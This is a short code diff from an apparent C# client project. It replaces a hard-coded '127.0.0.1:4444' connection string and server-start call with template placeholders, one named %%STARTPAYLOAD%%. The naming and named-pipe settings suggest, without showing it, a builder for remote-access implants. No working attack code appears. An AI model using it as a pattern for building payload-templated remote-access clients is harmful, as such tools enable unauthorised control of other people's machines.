@@ -621,9 +621,9 @@ namespace myclient
         {
             MyApp t_app = new MyApp();
             
-            t_app.ipstring = "127.0.0.1:4444";
-            
-            t_app.StartServer();
+            %%INITSTRINGONE%%
+            %%INITSTRINGTWO%%
+            %%STARTPAYLOAD%%
             //t_app.ipstring = "";
             //t_app.namepipehost = "";
             //t_app.namepipestring = "";
